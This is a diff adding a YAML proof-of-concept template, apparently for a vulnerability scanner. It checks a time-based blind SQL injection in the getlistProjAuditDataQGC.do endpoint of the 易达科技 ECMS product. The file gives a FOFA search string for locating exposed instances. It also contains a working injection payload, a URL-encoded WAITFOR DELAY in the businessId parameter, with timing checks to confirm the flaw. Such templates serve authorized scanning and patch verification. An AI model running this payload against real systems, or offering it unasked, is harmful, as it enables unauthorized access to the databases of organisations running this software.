@@ -1,0 +1,27 @@
+id: poc-yaml-gczj-ecms-getlistprojauditdataqgc-do-sqli
+info:
+  name: 易达科技-ECMS getlistProjAuditDataQGC.do SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: ecms
+  fofa: app="易达科技-ECMS"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /procedure/getlistProjAuditDataQGC.do?projAudit.isOut=1&businessId=1'
+  expression: status_code == 200 && trim(body) == "{}"
+- method: GET
+  path: /procedure/getlistProjAuditDataQGC.do?projAudit.isOut=1&businessId=1%27WAITFOR%20DELAY%20%270:0:{{.t1}}%27--&uesrId=1&costWorkId=1&flowId=1
+  expression: 'status_code == 200 &&
+
+    trim(body) == `{"rows":[]}` &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
